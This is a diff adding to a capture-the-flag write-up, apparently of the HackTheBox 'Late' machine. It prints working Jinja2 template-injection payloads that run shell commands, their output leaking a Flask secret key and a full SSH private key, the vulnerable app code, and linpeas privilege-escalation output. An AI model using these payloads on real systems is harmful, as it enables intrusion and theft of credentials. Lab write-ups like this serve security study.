@@ -147,8 +147,227 @@ By creating this image with this condition I am able to recieve an output.
 
 So we know that this is working. 
 
+```console
+{{ config.items() }}
+```
+
+using this we get this returned. 
+
+```console
+<p>dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])
+</p>
+```
+When running {{7*'7'}} we get the answer of 7777777 so we know its Jinja2 based on this portswigger article. 
+
+https://portswigger.net/research/server-side-template-injection
+
+I found this page that goes into details about jinja2
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection
+
+```console
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+```
+this command I was able to get the user ID
+
+```console
+<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+
+</p>
+```
+SVC_ACC
+
+then running because I know that SSH was open, so I decided to look for a id/rsa within the .ssh account.  
+
+![2022-05-06 14_04_23-werz - Discord](https://user-images.githubusercontent.com/68706090/167218801-d860ded7-8f11-4104-afc5-fa4f6154bd17.png)
+
+this from it I was able to get the RSA private Key
+
+```console
+<p>-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
+HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
+bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
+/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
+d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
+7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
+fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
+ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
+W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
+uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
+T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
+Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
+WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
+Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
+t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
+0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
+uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
+3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
+GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
+ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
+Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
+kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
+K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
+kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
+-----END RSA PRIVATE KEY-----
+
+</p>
+```
+
+### SSH with Private Key
+
+```console
+noob2uub@kali:~/ctf/htb/late$ chmod 600 id_rsa 
+noob2uub@kali:~/ctf/htb/late$ ssh -i id_rsa svc_acc@10.10.11.156
+load pubkey "id_rsa": invalid format
+svc_acc@late:~$ cat id_rsa
+cat: id_rsa: No such file or directory
+svc_acc@late:~$ ls
+app  user.txt
+svc_acc@late:~$ 
+``` 
+We are in and we see that we can view the folders we can access
+
+```console
+svc_acc@late:~$ ls -la
+total 40
+drwxr-xr-x 7 svc_acc svc_acc 4096 Apr  7 13:51 .
+drwxr-xr-x 3 root    root    4096 Jan  5 10:44 ..
+drwxrwxr-x 7 svc_acc svc_acc 4096 Apr  4 13:28 app
+lrwxrwxrwx 1 svc_acc svc_acc    9 Jan 16 18:45 .bash_history -> /dev/null
+-rw-r--r-- 1 svc_acc svc_acc 3771 Apr  4  2018 .bashrc
+drwx------ 3 svc_acc svc_acc 4096 Apr  7 13:51 .cache
+drwx------ 3 svc_acc svc_acc 4096 Jan  5 10:45 .gnupg
+drwxrwxr-x 5 svc_acc svc_acc 4096 Jan  5 12:13 .local
+-rw-r--r-- 1 svc_acc svc_acc  807 Apr  4  2018 .profile
+drwx------ 2 svc_acc svc_acc 4096 Apr  7 11:08 .ssh
+-rw-r----- 1 root    svc_acc   33 May  5 22:36 user.txt
+```
+I was able to find two .py files and ran strings on them.
+
+### Strings
+
+```console
+svc_acc@late:~/app$ strings main.py 
+import datetime
+import os, random
+from flask.templating import render_template_string
+from werkzeug.utils import secure_filename
+import PIL.Image
+import pytesseract
+from PIL import Image
+from flask import Flask, request, render_template, redirect, url_for, session, send_file
+app = Flask(__name__)
+upload_dir = "/home/svc_acc/app/uploads"
+misc_dir = '/home/svc_acc/app/misc'
+allowed_extensions =  ["jpg" ,'png']
+app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
+@app.route('/')
+def home():
+    return render_template("index.html", title="Image Reader")
+@app.route('/scanner', methods=['GET', 'POST'])
+def scan_file():
+    scanned_text = ''
+    results = ''
+    if request.method == 'POST':
+        start_time = datetime.datetime.now()
+        f = request.files['file']
+        
+        if f.filename.split('.')[-1] in allowed_extensions:
+            try:
+                ID = str(random.randint(1,10000))
+                file_name = upload_dir + "/" + secure_filename(f.filename )+ ID
+                f.save(file_name)
+                pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'
+                scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))
+                results = """<p>{}</p>""".format(scanned_text)
+                r = render_template_string(results)
+                path = misc_dir + "/" + ID + '_' + 'results.txt'
+            
+                with open(path, 'w') as f:
+                    f.write(r)
+                return send_file(path, as_attachment=True,attachment_filename='results.txt')
+            except Exception as e:
+                return ('Error occured while processing the image: ' + str(e))
+        else:
+            return 'Invalid Extension'
+svc_acc@late:~/app$ ls
+main.py  misc  __pycache__  static  templates  uploads  wsgi.py
+svc_acc@late:~/app$ strings wsgi.py 
+from main import app
+if __name__ == '__main__':
+    app.run(debug=False, host="0.0.0.0", port=50816)
+    
+```
+
+Ok the main.py file looks like the image scanner
+
+nothing on that seems useful so lets run linpeas on the box. 
+
+### Linpeas.sh
+
+a few things to take a look at:
+
+#)You_can_write_even_more_files_inside_last_directory
+
+/usr/local/sbin
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+You own the script: /usr/local/sbin/ssh-alert.sh
+/usr/bin/gettext.sh
+
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+
+═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
+                                         ╚═══════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-xr-- 1 root dip 370K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root root 10K Jan 13  2018 /usr/sbin/sensible-mda (Unknown SUID binary)
+-rwsr-xr-x 1 root root 75K Jan 25 16:26 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 37K Jan 25 16:26 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 59K Jan 25 16:26 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 40K Jan 25 16:26 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 44K Jan 25 16:26 /usr/bin/chsh
+-rwsr-xr-x 1 root root 22K Jun 28  2019 /usr/bin/arping
+-rwsr-sr-x 1 root mail 95K Nov 16  2017 /usr/bin/procmail
+-rwsr-xr-x 1 root root 37K Jan 25 16:26 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 75K Jan 25 16:26 /usr/bin/gpasswd
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 427K Mar  3  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 14K Jan 12 12:34 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K Jan 25 16:26 /bin/su
+-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
 
 
